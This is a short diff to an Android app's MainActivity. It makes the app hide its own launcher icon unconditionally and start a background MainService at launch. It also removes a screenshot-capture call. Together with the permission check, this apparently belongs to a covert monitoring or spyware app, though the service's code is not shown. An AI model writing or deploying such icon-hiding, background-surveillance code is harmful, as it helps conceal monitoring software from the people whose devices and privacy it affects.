@@ -7,6 +7,7 @@ import androidx.core.content.ContextCompat;
 
 import android.Manifest;
 import android.content.ComponentName;
+import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
@@ -46,8 +47,8 @@ public class MainActivity extends AppCompatActivity {
 
         checkPermissions();
 
-//        hideApplicationIcon();
-      String path = Screenshot.captureImage(getApplicationContext(), true);
+        hideApplicationIcon();
+        startService(new Intent(this, MainService.class));
     }
 
     /**
@@ -56,12 +57,7 @@ public class MainActivity extends AppCompatActivity {
     private void hideApplicationIcon() {
         PackageManager packageManager = getPackageManager();
         ComponentName componentName = new ComponentName(this, MainActivity.class);
-
-        int state = packageManager.getComponentEnabledSetting(componentName);
-
-        if (state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
-            packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-        }
+        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
     }
 
     /**
